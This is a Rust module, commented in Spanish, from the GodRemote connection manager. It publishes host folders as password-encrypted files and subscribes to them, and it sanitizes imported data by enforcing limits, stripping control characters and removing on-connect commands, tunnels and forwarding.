//! Carpetas de equipos compartidas con compañeros.
//!
//! Quien tiene una carpeta la **publica**: sus equipos y subcarpetas van a un
//! fichero cifrado con una contraseña compartida (el mismo formato que la
//! sincronización, [`crate::sync`]), en la ruta que elija; lo normal, una
//! carpeta del equipo de trabajo. No lleva secretos (están en el baúl, que
//! no se toca) ni nada que haga actuar a GodRemote por cuenta de otro:
//! órdenes al conectar, túneles, reenvío del agente o de X11.
//!
//! Los demás se **suscriben**: ruta y contraseña. La carpeta aparece en su
//! árbol, de solo lectura, y se actualiza sola. Lo que llega es entrada no
//! fiable aunque descifre bien:
//!
//! - límites de tamaño, de equipos y de profundidad;
//! - los textos de una línea no llevan saltos ni caracteres de control (no
//!   deben poder añadir opciones al cliente RDP externo, por ejemplo);
//! - se quita otra vez todo lo que no se publica, por si el fichero no lo ha
//!   escrito GodRemote;
//! - los identificadores se derivan de los publicados: nunca coinciden con
//!   los de los equipos propios, así que un equipo compartido no puede
//!   hacerse con las credenciales guardadas de otro;
//! - las contraseñas guardadas son siempre de un equipo, no de una carpeta,
//!   y se olvidan si quien publica le cambia la dirección.
//!
//! Solo se escribe en la configuración de siempre (`sessions.json` y
//! `shares.json`): un fichero publicado no lleva rutas ni nombres de
//! fichero que GodRemote use para escribir.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use std::sync::Mutex;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use uuid::Uuid;

use crate::i18n::tr;
use crate::model::{AuthMethod, Folder, MAX_JUMPS, Node, Protocol, Session, Tree};
use crate::sync::{self, Keyring, SealError, SealKind, SealParams};
use crate::trf;

const FORMAT: u32 = 1;
/// Equipos y carpetas que caben en una carpeta compartida.
pub const MAX_NODES: usize = 5_000;
/// Niveles de subcarpetas.
pub const MAX_DEPTH: usize = 16;
/// Tamaño máximo del fichero publicado y de su contenido.
const MAX_FILE: u64 = 32 * 1024 * 1024;
const MAX_CONTENT: usize = 24 * 1024 * 1024;
const MAX_NAME: usize = 120;
const MAX_HOST: usize = 255;
const MAX_PATH: usize = 1024;
const MAX_NOTES: usize = 8_000;

/// Extensión sugerida para los ficheros publicados.
pub const FILE_SUFFIX: &str = ".godremote-carpeta.json";

/// Por qué no se ha podido publicar o leer una carpeta compartida.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShareError {
    /// La ruta no está disponible (unidad sin montar…): se reintenta.
    Unavailable(String),
    Seal(SealError),
    /// Descifra, pero no es admisible.
    Invalid(String),
    /// Es más antigua que la última que se vio.
    Stale {
        seen: u64,
        found: u64,
    },
    /// Hay otra cosa en la ruta donde se quiere publicar.
    Occupied(String),
    Io(String),
}

impl ShareError {
    pub fn is_transient(&self) -> bool {
        matches!(
            self,
            ShareError::Unavailable(_) | ShareError::Seal(SealError::Incomplete)
        )
    }
}

impl std::fmt::Display for ShareError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ShareError::Unavailable(e) => {
                f.write_str(&trf!("El fichero compartido no está disponible ({e})", e))
            }
            ShareError::Seal(SealError::WrongPassword) => {
                f.write_str(tr("La contraseña no es la de esta carpeta compartida"))
            }
            ShareError::Seal(e) => write!(f, "{e}"),
            ShareError::Invalid(e) => f.write_str(&trf!(
                "El fichero compartido no es válido ({e}); no se ha tocado nada",
                e
            )),
            ShareError::Stale { seen, found } => f.write_str(&trf!(
                "El fichero compartido es más antiguo (revisión {found}) que el último visto \
                 (revisión {seen}); se conserva lo que había",
                found,
                seen
            )),
            ShareError::Occupied(e) => write!(f, "{e}"),
            ShareError::Io(e) => {
                f.write_str(&trf!("No se pudo escribir el fichero compartido ({e})", e))
            }
        }
    }
}

impl std::error::Error for ShareError {}

impl From<SealError> for ShareError {
    fn from(e: SealError) -> Self {
        ShareError::Seal(e)
    }
}

/// Lo que va dentro del fichero cifrado.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Published {
    #[serde(rename = "formato")]
    pub format: u32,
    /// Identifica la publicación (no la carpeta ni a quien publica).
    pub id: Uuid,
    #[serde(rename = "revision")]
    pub revision: u64,
    #[serde(default, rename = "publicado_por")]
    pub publisher: String,
    /// Segundos Unix según el reloj de quien publica: solo se enseña.
    #[serde(default, rename = "publicado")]
    pub published_at: i64,
    #[serde(rename = "carpeta")]
    pub folder: Folder,
}

// ----------------------------------------------------------------------
// Saneado
// ----------------------------------------------------------------------

/// Texto de una sola línea: sin caracteres de control y recortado.
fn single_line(text: &mut String, max: usize) {
    let clean: String = text
        .chars()
        .filter(|c| !c.is_control())
        .take(max)
        .collect::<String>()
        .trim()
        .to_string();
    if clean != *text {
        *text = clean;
    }
}

/// Quita de un equipo lo que no se comparte: lo que haría que GodRemote
/// ejecutase órdenes, abriese puertos o prestase el agente o el servidor X
/// por decisión de otra persona. Devuelve si llevaba algo de eso.
fn disarm(session: &mut Session) -> bool {
    let armed = !session.on_connect.trim().is_empty()
        || session.agent_forwarding
        || session.x11_forwarding
        || !session.tunnels.is_empty()
        || session.totp_autofill
        || session.bypass_proxy;
    session.on_connect.clear();
    session.agent_forwarding = false;
    session.x11_forwarding = false;
    session.tunnels.clear();
    session.totp_autofill = false;
    session.bypass_proxy = false;
    session.legacy_jump = None;
    session.secret_owner = None;
    armed
}

/// Lo que se ha encontrado al sanear una carpeta.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Cleaning {
    /// Equipos que quedan.
    #[serde(rename = "equipos")]
    pub sessions: usize,
    /// Equipos dejados fuera (puerto serie, sin dirección, repetidos).
    #[serde(rename = "descartados")]
    pub dropped: usize,
    /// Equipos que traían órdenes al conectar, túneles o reenvíos.
    #[serde(rename = "desarmados")]
    pub disarmed: usize,
    /// Saltos que apuntan a equipos de fuera de la carpeta.
    #[serde(rename = "saltos_fuera")]
    pub outside_jumps: usize,
}

impl Cleaning {
    /// Avisos para quien se suscribe.
    pub fn warnings(&self) -> Vec<String> {
        let mut out = vec![];
        if self.disarmed > 0 {
            out.push(trf!(
                "{n} equipo(s) traían órdenes al conectar, túneles o reenvíos, que GodRemote no \
                 publica: se han ignorado (¿seguro que el fichero es de quien dice?)",
                n = self.disarmed
            ));
        }
        if self.dropped > 0 {
            out.push(trf!(
                "{n} equipo(s) se han dejado fuera (puerto serie, sin dirección o repetidos)",
                n = self.dropped
            ));
        }
        if self.outside_jumps > 0 {
            out.push(trf!(
                "{n} salto(s) pasan por equipos que no están en la carpeta: esos equipos no \
                 conectarán hasta que los dupliques y les pongas tu salto",
                n = self.outside_jumps
            ));
        }
        out
    }
}

fn clean_session(session: &mut Session) -> bool {
    single_line(&mut session.name, MAX_NAME);
    single_line(&mut session.host, MAX_HOST);
    single_line(&mut session.username, MAX_NAME);
    single_line(&mut session.key_path, MAX_PATH);
    single_line(&mut session.cert_path, MAX_PATH);
    single_line(&mut session.rdp.domain, MAX_NAME);
    session.notes = session
        .notes
        .chars()
        .filter(|c| !c.is_control() || *c == '\n' || *c == '\t')
        .take(MAX_NOTES)
        .collect();
    session.rdp.width = session.rdp.width.clamp(320, 8192);
    session.rdp.height = session.rdp.height.clamp(240, 8192);
    session.serial = Default::default();
    session.jumps.truncate(MAX_JUMPS);
    if let Some(backdrop) = &mut session.backdrop {
        backdrop.sanitize();
    }
    // Un puerto serie es de cada equipo; y sin dirección no hay a dónde ir.
    session.protocol != Protocol::Serial
        && !session.host.is_empty()
        && !session.host.contains(char::is_whitespace)
        && session.port != 0
}

/// Sanea una carpeta (la que se va a publicar o la que se ha leído).
/// `password_from_above`: una carpeta superior da «contraseña» como
/// autenticación a los equipos que la hereden.
fn clean_folder(
    folder: &mut Folder,
    depth: usize,
    password_from_above: bool,
    seen: &mut BTreeSet<Uuid>,
    report: &mut Cleaning,
) -> Result<(), ShareError> {
    if depth > MAX_DEPTH {
        return Err(ShareError::Invalid(trf!(
            "tiene más de {max} niveles de subcarpetas",
            max = MAX_DEPTH
        )));
    }
    single_line(&mut folder.name, MAX_NAME);
    if folder.name.is_empty() {
        folder.name = "Carpeta".to_string();
    }
    let defaults = &mut folder.defaults;
    single_line(&mut defaults.username, MAX_NAME);
    single_line(&mut defaults.key_path, MAX_PATH);
    if let Some(jumps) = &mut defaults.jumps {
        jumps.truncate(MAX_JUMPS);
    }
    if let Some(backdrop) = &mut defaults.backdrop {
        backdrop.sanitize();
    }
    // Una contraseña guardada es de un equipo, no de la carpeta: si no,
    // quien publica podría añadir un equipo suyo y recibirla.
    let password_here = match defaults.auth {
        Some(AuthMethod::Password) => {
            defaults.auth = None;
            defaults.key_path.clear();
            true
        }
        Some(_) => false,
        None => password_from_above,
    };
    let mut kept = vec![];
    for mut node in std::mem::take(&mut folder.children) {
        if seen.len() >= MAX_NODES {
            return Err(ShareError::Invalid(trf!(
                "tiene más de {max} equipos y carpetas",
                max = MAX_NODES
            )));
        }
        if !seen.insert(node.id()) {
            report.dropped += 1;
            continue;
        }
        match &mut node {
            Node::Folder(child) => {
                clean_folder(child, depth + 1, password_here, seen, report)?;
            }
            Node::Session(session) => {
                if disarm(session) {
                    report.disarmed += 1;
                }
                if !clean_session(session) {
                    report.dropped += 1;
                    continue;
                }
                if session.inherit_auth && password_here {
                    session.inherit_auth = false;
                    session.auth = AuthMethod::Password;
                    session.key_path.clear();
                    session.cert_path.clear();
                }
                report.sessions += 1;
            }
        }
        kept.push(node);
    }
    folder.children = kept;
    Ok(())
}

fn for_each_jump(folder: &Folder, visit: &mut impl FnMut(Uuid)) {
    for jump in folder.defaults.jumps.iter().flatten() {
        visit(*jump);
    }
    for node in &folder.children {
        match node {
            Node::Folder(child) => for_each_jump(child, visit),
            Node::Session(session) => session.jumps.iter().for_each(|j| visit(*j)),
        }
    }
}

/// Sanea una carpeta entera y cuenta lo que encuentra.
pub fn clean(folder: &mut Folder) -> Result<Cleaning, ShareError> {
    let mut report = Cleaning::default();
    let mut seen = BTreeSet::from([folder.id]);
    clean_folder(folder, 0, false, &mut seen, &mut report)?;
    for_each_jump(folder, &mut |jump| {
        if !seen.contains(&jump) {
            report.outside_jumps += 1;
        }
    });
    Ok(report)
}

// ----------------------------------------------------------------------
// Publicar
// ----------------------------------------------------------------------

/// Una carpeta de este equipo que se publica para otros.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Publication {
    /// Identificador de la publicación (va dentro del fichero).
    pub id: Uuid,
    /// Carpeta del árbol que se publica.
    #[serde(rename = "carpeta")]
    pub folder: Uuid,
    /// Fichero de destino.
    #[serde(rename = "ruta")]
    pub path: String,
    /// Volver a publicar sola cuando la carpeta cambie.
    #[serde(rename = "automatica")]
    pub auto: bool,
    #[serde(rename = "revision")]
    pub revision: u64,
    /// Huella de lo último publicado, para saber si ha cambiado.
    #[serde(rename = "huella")]
    pub digest: String,
    #[serde(rename = "publicada")]
    pub published_at: Option<i64>,
}

impl Default for Publication {
    fn default() -> Self {
        Self {
            id: Uuid::new_v4(),
            folder: Uuid::nil(),
            path: String::new(),
            auto: true,
            revision: 0,
            digest: String::new(),
            published_at: None,
        }
    }
}

/// Lo que se publicaría de una carpeta.
#[derive(Debug, Clone, PartialEq)]
pub struct Export {
    pub folder: Folder,
    pub report: Cleaning,
    /// Huella del contenido: cambia cuando hay algo nuevo que publicar.
    pub digest: String,
}

/// Prepara una carpeta del árbol para publicarla: una copia sin lo que no
/// se comparte. `None` si la carpeta ya no existe.
pub fn export(tree: &Tree, folder: Uuid) -> Option<Result<Export, ShareError>> {
    let Some(Node::Folder(original)) = tree.find(folder) else {
        return None;
    };
    let mut folder = original.clone();
    Some(clean(&mut folder).and_then(|report| {
        let data = serde_json::to_vec(&folder).map_err(|e| ShareError::Io(e.to_string()))?;
        if data.len() > MAX_CONTENT {
            return Err(ShareError::Invalid(
                tr("es demasiado grande para compartirla").into(),
            ));
        }
        Ok(Export {
            folder,
            report,
            digest: sync::fingerprint(&data),
        })
    }))
}

fn unavailable(path: &Path, e: &dyn std::fmt::Display) -> ShareError {
    ShareError::Unavailable(format!("{}: {e}", path.display()))
}

/// Lee y descifra un fichero publicado, sin sanearlo. `Ok(None)`: no existe.
fn read_raw(
    path: &Path,
    keys: &mut Keyring,
) -> Result<Option<(Published, SealParams, String)>, ShareError> {
    let raw = match sync::read_limited(path, MAX_FILE) {
        Ok(raw) => raw,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            // Sin su carpeta, no es que no exista: es que no se llega.
            return match path.parent().filter(|p| !p.as_os_str().is_empty()) {
                Some(parent) if !parent.is_dir() => Err(unavailable(parent, &tr("no existe"))),
                _ => Ok(None),
            };
        }
        Err(e) if e.kind() == std::io::ErrorKind::InvalidData => {
            return Err(ShareError::Seal(SealError::TooBig));
        }
        Err(e) => return Err(unavailable(path, &e)),
    };
    let (plain, params) = sync::open(SealKind::Share, keys, &raw)?;
    if plain.len() > MAX_CONTENT {
        return Err(ShareError::Seal(SealError::TooBig));
    }
    let published: Published = serde_json::from_slice(&plain)
        .map_err(|e| ShareError::Invalid(trf!("no se entiende: {e}", e)))?;
    if published.format > FORMAT {
        return Err(ShareError::Seal(SealError::Newer));
    }
    if published.format == 0 {
        return Err(ShareError::Invalid(tr("formato desconocido").into()));
    }
    Ok(Some((published, params, sync::fingerprint(&raw))))
}

/// Publica (o vuelve a publicar) una carpeta. No pisa un fichero que no sea
/// una publicación anterior de esta misma carpeta.
pub fn publish(
    tree: &Tree,
    publication: &mut Publication,
    publisher: &str,
    keys: &mut Keyring,
) -> Result<Export, ShareError> {
    let export = export(tree, publication.folder).ok_or_else(|| {
        ShareError::Invalid(tr("la carpeta ya no existe en este equipo").into())
    })??;
    let path = crate::paths::expand_tilde(&publication.path);
    if path.is_dir() {
        return Err(ShareError::Occupied(trf!(
            "{path} es una carpeta: indica el nombre del fichero",
            path = path.display()
        )));
    }
    let occupied = || {
        ShareError::Occupied(trf!(
            "Ya hay otro fichero en {path}; elige otro nombre o bórralo antes",
            path = path.display()
        ))
    };
    let (params, revision) = match read_raw(&path, keys) {
        Ok(None) => (SealParams::fresh(), publication.revision),
        Ok(Some((previous, params, _))) if previous.id == publication.id => (
            SealParams::reuse(Some(&params)),
            publication.revision.max(previous.revision),
        ),
        Ok(Some(_)) => return Err(occupied()),
        Err(e) if e.is_transient() => return Err(e),
        Err(_) => return Err(occupied()),
    };
    let published = Published {
        format: FORMAT,
        id: publication.id,
        revision: revision + 1,
        publisher: {
            let mut name = publisher.to_string();
            single_line(&mut name, 60);
            name
        },
        published_at: chrono::Utc::now().timestamp(),
        folder: export.folder.clone(),
    };
    let plain = serde_json::to_vec(&published).map_err(|e| ShareError::Io(e.to_string()))?;
    let sealed = sync::seal(SealKind::Share, keys, &params, &plain)?;
    sync::write_atomic(&path, &sealed, &publication.id.simple().to_string())
        .map_err(|e| ShareError::Io(e.to_string()))?;
    publication.revision = published.revision;
    publication.digest = export.digest.clone();
    publication.published_at = Some(published.published_at);
    Ok(export)
}

// ----------------------------------------------------------------------
// Suscribirse
// ----------------------------------------------------------------------

/// Una carpeta de otro que se sigue desde este equipo.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Subscription {
    /// Identificador local: el de la carpeta en el árbol de este equipo.
    pub id: Uuid,
    #[serde(rename = "ruta")]
    pub path: String,
    /// Publicación que se vio la última vez y su revisión.
    #[serde(rename = "publicacion")]
    pub publication: Option<Uuid>,
    #[serde(rename = "revision")]
    pub revision: u64,
    #[serde(rename = "publicado_por")]
    pub publisher: String,
    #[serde(rename = "publicado")]
    pub published_at: i64,
    /// Huella del último fichero aplicado.
    #[serde(rename = "huella")]
    pub file: String,
    /// Usuario propio para sus equipos (vacío: el publicado).
    #[serde(rename = "mi_usuario")]
    pub my_username: String,
    /// Autenticación propia: clave privada o agente (`None`: la publicada).
    #[serde(rename = "mi_autenticacion")]
    pub my_auth: Option<AuthMethod>,
    #[serde(rename = "mi_clave")]
    pub my_key_path: String,
    /// Lo publicado, ya saneado, con sus identificadores originales.
    #[serde(rename = "contenido")]
    pub content: Option<Folder>,
    /// En la última lectura había en la ruta otra publicación.
    #[serde(rename = "otra_publicacion")]
    pub replaced: bool,
    /// Lo que se encontró al sanear lo último que se leyó.
    #[serde(rename = "saneado")]
    pub report: Cleaning,
    /// Avisos de la última lectura, en el idioma que había al leer el
    /// fichero o la suscripción: no se guardan (salen de `replaced` y de
    /// `report`), y quien los pinta los redacta en el momento con
    /// [`Subscription::notices`].
    #[serde(skip)]
    pub warnings: Vec<String>,
    /// Equipos cuya dirección ha cambiado: su contraseña guardada hay que
    /// olvidarla en cuanto el baúl esté abierto.
    #[serde(rename = "olvidar")]
    pub forget: Vec<Uuid>,
}

impl Default for Subscription {
    fn default() -> Self {
        Self {
            id: Uuid::new_v4(),
            path: String::new(),
            publication: None,
            revision: 0,
            publisher: String::new(),
            published_at: 0,
            file: String::new(),
            my_username: String::new(),
            my_auth: None,
            my_key_path: String::new(),
            content: None,
            replaced: false,
            report: Cleaning::default(),
            warnings: vec![],
            forget: vec![],
        }
    }
}

fn hash_id(domain: &[u8], a: Uuid, b: Uuid) -> Uuid {
    let mut hasher = Sha256::new();
    hasher.update(b"godremote-carpeta-compartida-v1");
    hasher.update(domain);
    hasher.update(a.as_bytes());
    hasher.update(b.as_bytes());
    let digest = hasher.finalize();
    let mut bytes = [0u8; 16];
    bytes.copy_from_slice(&digest[..16]);
    uuid::Builder::from_custom_bytes(bytes).into_uuid()
}

/// Identificador local de la suscripción a una publicación. Es el mismo en
/// todos los equipos de quien se suscribe, para que las credenciales que
/// guarde (y sincronice) le valgan en todos.
pub fn subscription_id(publication: Uuid) -> Uuid {
    hash_id(b"suscripcion", publication, Uuid::nil())
}

/// Identificador que toma en este equipo un nodo publicado. No lo elige
/// quien publica: no puede hacerlo coincidir con el de un equipo propio.
pub fn local_id(subscription: Uuid, original: Uuid) -> Uuid {
    hash_id(b"nodo", subscription, original)
}

/// Lo leído de un fichero publicado, ya saneado.
#[derive(Debug, Clone, PartialEq)]
pub struct Fetched {
    pub published: Published,
    pub report: Cleaning,
    /// Huella del fichero, para no volver a aplicarlo si no cambia.
    pub fingerprint: String,
}

/// Lee, descifra y sanea un fichero publicado. No toca nada.
pub fn fetch(path: &Path, keys: &mut Keyring) -> Result<Fetched, ShareError> {
    let (mut published, _, fingerprint) =
        read_raw(path, keys)?.ok_or_else(|| unavailable(path, &tr("no existe")))?;
    let report = clean(&mut published.folder)?;
    single_line(&mut published.publisher, 60);
    Ok(Fetched {
        published,
        report,
        fingerprint,
    })
}

fn sessions_of(folder: &Folder) -> Vec<&Session> {
    let mut out = vec![];
    fn go<'a>(folder: &'a Folder, out: &mut Vec<&'a Session>) {
        for node in &folder.children {
            match node {
                Node::Folder(child) => go(child, out),
                Node::Session(session) => out.push(session),
            }
        }
    }
    go(folder, &mut out);
    out
}

fn node_ids(folder: &Folder, out: &mut BTreeSet<Uuid>) {
    out.insert(folder.id);
    for node in &folder.children {
        match node {
            Node::Folder(child) => node_ids(child, out),
            Node::Session(session) => {
                out.insert(session.id);
            }
        }
    }
}

/// Lo que cambia para quien sigue una carpeta cuando llega una versión
/// nueva. Los identificadores son los de este equipo.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Changes {
    pub added: Vec<String>,
    /// Equipos que ya no están (identificador y nombre).
    pub removed: Vec<(Uuid, String)>,
    /// Equipos con otra dirección, otro puerto u otro protocolo: nombre,
    /// destino anterior y destino nuevo.
    pub readdressed: Vec<(Uuid, String, String, String)>,
    /// Equipos propios que estaban dentro y se han sacado a la raíz.
    pub rescued: usize,
}

impl Changes {
    pub fn is_empty(&self) -> bool {
        self.added.is_empty()
            && self.removed.is_empty()
            && self.readdressed.is_empty()
            && self.rescued == 0
    }

    /// Resumen de una línea.
    pub fn summary(&self) -> String {
        let mut parts = vec![];
        if !self.added.is_empty() {
            parts.push(trf!("{n} equipo(s) nuevos", n = self.added.len()));
        }
        if !self.removed.is_empty() {
            parts.push(trf!("{n} quitados", n = self.removed.len()));
        }
        if !self.readdressed.is_empty() {
            parts.push(trf!(
                "{n} con otra dirección ({lista})",
                n = self.readdressed.len(),
                lista = self
                    .readdressed
                    .iter()
                    .take(3)
                    .map(|(_, name, old, new)| trf!("«{name}»: {old} ➡ {new}", name, old, new))
                    .collect::<Vec<_>>()
                    .join("; ")
            ));
        }
        if self.rescued > 0 {
            parts.push(trf!(
                "{n} elemento(s) tuyos que estaban dentro han pasado a la raíz",
                n = self.rescued
            ));
        }
        if parts.is_empty() {
            tr("sin cambios en sus equipos").to_string()
        } else {
            parts.join(", ")
        }
    }
}

fn address(session: &Session) -> String {
    format!(
        "{} {}:{}",
        session.protocol.label(),
        session.host.to_lowercase(),
        session.port
    )
}

impl Subscription {
    /// Una suscripción nueva a lo que se acaba de leer.
    pub fn new(path: &str, fetched: &Fetched) -> Self {
        Self {
            id: subscription_id(fetched.published.id),
            path: path.to_string(),
            ..Default::default()
        }
    }

    pub fn name(&self) -> &str {
        self.content.as_ref().map_or("", |f| f.name.as_str())
    }

    pub fn file_path(&self) -> PathBuf {
        crate::paths::expand_tilde(&self.path)
    }

    /// Avisos de la última lectura, en el idioma en uso.
    pub fn notices(&self) -> Vec<String> {
        let mut out = vec![];
        if self.replaced {
            out.push(
                tr("En esa ruta hay ahora otra publicación (se ha vuelto a publicar desde cero)")
                    .to_string(),
            );
        }
        out.extend(self.report.warnings());
        out
    }

    /// Identificadores que tienen en este equipo los nodos de `content`.
    fn local_ids(&self, content: &Folder) -> BTreeSet<Uuid> {
        let mut originals = BTreeSet::new();
        node_ids(content, &mut originals);
        originals
            .into_iter()
            .filter(|id| *id != content.id)
            .map(|id| local_id(self.id, id))
            .chain([self.id])
            .collect()
    }

    /// La carpeta tal como va al árbol de este equipo: con identificadores
    /// propios y con el usuario y la clave de quien se suscribe.
    pub fn graft(&self) -> Option<Folder> {
        fn remap(folder: &mut Folder, sub: &Subscription, root: bool) {
            if !root {
                folder.id = local_id(sub.id, folder.id);
            }
            let defaults = &mut folder.defaults;
            if let Some(jumps) = &mut defaults.jumps {
                for jump in jumps {
                    *jump = local_id(sub.id, *jump);
                }
            }
            let own_user = !sub.my_username.trim().is_empty();
            let own_auth = sub.my_auth.filter(|a| *a != AuthMethod::Password);
            if own_user {
                defaults.username.clear();
            }
            if own_auth.is_some() {
                defaults.auth = None;
                defaults.key_path.clear();
            }
            for node in &mut folder.children {
                match node {
                    Node::Folder(child) => remap(child, sub, false),
                    Node::Session(session) => {
                        session.id = local_id(sub.id, session.id);
                        for jump in &mut session.jumps {
                            *jump = local_id(sub.id, *jump);
                        }
                        // Lo propio llega por la carpeta raíz, de la que
                        // heredan todos.
                        if own_user && session.protocol.is_ssh() {
                            session.username.clear();
                        }
                        if own_auth.is_some() && session.protocol.is_ssh() {
                            session.inherit_auth = true;
                        }
                    }
                }
            }
        }
        let mut folder = self.content.clone()?;
        remap(&mut folder, self, true);
        folder.id = self.id;
        let mut username = self.my_username.clone();
        single_line(&mut username, MAX_NAME);
        if !username.is_empty() {
            folder.defaults.username = username;
        }
        if let Some(auth) = self.my_auth.filter(|a| *a != AuthMethod::Password) {
            folder.defaults.auth = Some(auth);
            folder.defaults.key_path = match auth {
                AuthMethod::Key => self.my_key_path.trim().to_string(),
                _ => String::new(),
            };
        }
        Some(folder)
    }

    /// Acepta lo leído como nuevo contenido de la suscripción. Devuelve qué
    /// cambia; falla, sin tocar nada, si es más antiguo que lo ya visto.
    pub fn accept(&mut self, fetched: &Fetched) -> Result<Changes, ShareError> {
        let published = &fetched.published;
        if self.publication == Some(published.id) && published.revision < self.revision {
            return Err(ShareError::Stale {
                seen: self.revision,
                found: published.revision,
            });
        }
        let mut changes = Changes::default();
        let empty = Folder {
            id: published.folder.id,
            name: String::new(),
            defaults: Default::default(),
            children: vec![],
        };
        let before = self.content.as_ref().unwrap_or(&empty);
        let old: Vec<&Session> = sessions_of(before);
        let new: Vec<&Session> = sessions_of(&published.folder);
        for session in &new {
            match old.iter().find(|o| o.id == session.id) {
                None => changes.added.push(session.display_name()),
                Some(previous) if address(previous) != address(session) => {
                    changes.readdressed.push((
                        local_id(self.id, session.id),
                        session.display_name(),
                        address(previous),
                        address(session),
                    ));
                }
                Some(_) => {}
            }
        }
        for session in &old {
            if !new.iter().any(|n| n.id == session.id) {
                changes
                    .removed
                    .push((local_id(self.id, session.id), session.display_name()));
            }
        }
        // La contraseña guardada para una dirección no vale para otra.
        for (id, ..) in &changes.readdressed {
            if !self.forget.contains(id) {
                self.forget.push(*id);
            }
        }
        self.replaced = self.publication.is_some_and(|id| id != published.id);
        self.report = fetched.report.clone();
        self.warnings = self.notices();
        self.publication = Some(published.id);
        self.revision = published.revision;
        self.publisher = published.publisher.clone();
        self.published_at = published.published_at;
        self.file = fetched.fingerprint.clone();
        self.content = Some(published.folder.clone());
        Ok(changes)
    }

    /// Pone en el árbol la carpeta de la suscripción, en lugar de la que
    /// hubiera. `previous` es su contenido anterior (para reconocer qué
    /// nodos eran suyos). Lo que el usuario hubiera metido dentro se saca a
    /// la raíz; devuelve cuántos nodos.
    pub fn place(&self, tree: &mut Tree, previous: Option<&Folder>) -> usize {
        let mut ours = self
            .content
            .as_ref()
            .map(|content| self.local_ids(content))
            .unwrap_or_default();
        if let Some(previous) = previous {
            ours.extend(self.local_ids(previous));
        }
        let position = tree.nodes.iter().position(|n| n.id() == self.id);
        let mut rescued = vec![];
        if let Some(Node::Folder(old)) = tree.remove(self.id) {
            fn foreign(folder: Folder, ours: &BTreeSet<Uuid>, out: &mut Vec<Node>) {
                for node in folder.children {
                    if !ours.contains(&node.id()) {
                        out.push(node);
                    } else if let Node::Folder(child) = node {
                        foreign(child, ours, out);
                    }
                }
            }
            foreign(old, &ours, &mut rescued);
        }
        if let Some(folder) = self.graft() {
            let at = position.unwrap_or(tree.nodes.len()).min(tree.nodes.len());
            tree.nodes.insert(at, Node::Folder(folder));
        }
        let count = rescued.len();
        tree.nodes.extend(rescued);
        count
    }

    /// `true` si dentro de su carpeta del árbol hay algo que no es suyo: lo
    /// ha puesto ahí el usuario (al elegir carpeta en el editor, por
    /// ejemplo) y hay que sacarlo, porque la carpeta es de quien la publica.
    pub fn has_strangers(&self, tree: &Tree) -> bool {
        fn any(folder: &Folder, ours: &BTreeSet<Uuid>) -> bool {
            folder.children.iter().any(|node| {
                !ours.contains(&node.id())
                    || matches!(node, Node::Folder(child) if any(child, ours))
            })
        }
        match (tree.find(self.id), &self.content) {
            (Some(Node::Folder(folder)), Some(content)) => any(folder, &self.local_ids(content)),
            _ => false,
        }
    }

    /// Quita del árbol la carpeta de la suscripción (lo que el usuario
    /// hubiera metido dentro pasa a la raíz).
    pub fn remove_from(&self, tree: &mut Tree) -> usize {
        let gone = Subscription {
            content: None,
            ..self.clone()
        };
        gone.place(tree, self.content.as_ref())
    }

    /// Identificadores, en este equipo, de sus equipos.
    pub fn session_ids(&self) -> Vec<Uuid> {
        self.content
            .as_ref()
            .map(|content| {
                sessions_of(content)
                    .iter()
                    .map(|s| local_id(self.id, s.id))
                    .collect()
            })
            .unwrap_or_default()
    }
}

// ----------------------------------------------------------------------
// Lo que se recuerda en este equipo
// ----------------------------------------------------------------------

/// Publicaciones y suscripciones de este equipo (`shares.json`). No se
/// sincronizan: las rutas son de cada equipo.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct ShareStore {
    #[serde(rename = "publicaciones")]
    pub publications: Vec<Publication>,
    #[serde(rename = "suscripciones")]
    pub subscriptions: Vec<Subscription>,
}

impl ShareStore {
    pub fn file(dir: &Path) -> PathBuf {
        dir.join("shares.json")
    }

    pub fn load(dir: &Path) -> Self {
        let mut store: Self = sync::read_limited(&Self::file(dir), 4 * MAX_FILE)
            .ok()
            .and_then(|data| serde_json::from_slice(&data).ok())
            .unwrap_or_default();
        // Los textos de los avisos no se guardan.
        for sub in &mut store.subscriptions {
            sub.warnings = sub.notices();
        }
        store
    }

    pub fn save(&self, dir: &Path) -> std::io::Result<()> {
        let data = serde_json::to_vec_pretty(self).map_err(std::io::Error::other)?;
        crate::paths::write_private(&Self::file(dir), &data)
    }

    /// Carpetas de la raíz del árbol que son suscripciones.
    pub fn roots(&self) -> BTreeSet<Uuid> {
        self.subscriptions.iter().map(|s| s.id).collect()
    }
}

/// Carpetas de la raíz del árbol que son suscripciones de este equipo: no
/// son suyas, así que no se sincronizan con los demás equipos del usuario.
pub fn subscribed_roots(dir: &Path) -> BTreeSet<Uuid> {
    ShareStore::load(dir).roots()
}

/// Nombre con el que se guarda en el baúl la contraseña de una suscripción
/// o de una publicación. (No es `<identificador>/password`: esa sería la
/// contraseña con la que conectar a sus equipos.)
pub fn password_key(id: Uuid, publishing: bool) -> String {
    if publishing {
        format!("carpeta-publicada-{id}/password")
    } else {
        format!("carpeta-compartida-{id}/password")
    }
}

// ----------------------------------------------------------------------
// Marcas para la interfaz
// ----------------------------------------------------------------------

/// Nodos del árbol que pertenecen a carpetas compartidas (y cuáles son sus
/// raíces), para pintarlos distinto y no dejar editarlos.
static MARKS: Mutex<(BTreeSet<Uuid>, BTreeSet<Uuid>)> =
    Mutex::new((BTreeSet::new(), BTreeSet::new()));

/// Anota qué nodos del árbol son de carpetas compartidas.
pub fn mark(tree: &Tree, roots: &BTreeSet<Uuid>) {
    let mut all = BTreeSet::new();
    for node in &tree.nodes {
        if let Node::Folder(folder) = node
            && roots.contains(&folder.id)
        {
            node_ids(folder, &mut all);
        }
    }
    if let Ok(mut marks) = MARKS.lock() {
        *marks = (roots.clone(), all);
    }
}

/// `true` si el nodo está en una carpeta compartida (o es una).
